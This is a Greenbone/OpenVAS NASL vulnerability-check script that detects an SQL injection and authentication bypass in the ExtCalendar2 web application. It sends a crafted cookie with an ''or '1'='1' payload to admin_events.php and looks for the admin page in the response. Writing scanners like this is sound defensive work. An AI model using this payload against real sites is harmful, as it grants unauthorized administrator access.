if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902772" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "creation_date", value: "2011-12-19 16:39:11 +0530 (Mon, 19 Dec 2011)" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_name( "ExtCalendar2 SQL Injection and Authentcation Bypass Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17562/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103274/extcalendar2bypass-sql.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to gain the
  administrator privileges and sensitive information." );
	script_tag( name: "affected", value: "ExtCalendar2" );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user-supplied input
  passed via the cookie to '/admin_events.php'." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is ExtCalendar2 and is prone to sql injection and
  authentcation bypass vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/ext", "/calendar", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: dir + "/calendar.php", port: port );
	if(ContainsString( rcvRes, ">Powered by" ) || ContainsString( rcvRes, ">ExtCalendar" )){
		filename = dir + "/admin_events.php";
		exp = "ext20_username=admin ' or '1'= '1; " + "ext20_password=admin ' or '1'= '1";
		sndReq2 = NASLString( "GET ", filename, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", http_get_user_agent(), "\\r\\n", "Cookie: ", exp, "\\r\\n\\r\\n" );
		rcvRes2 = http_keepalive_send_recv( port: port, data: sndReq2 );
		if(ContainsString( rcvRes2, ">Event Administration<" ) && ContainsString( rcvRes2, ">Logout" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

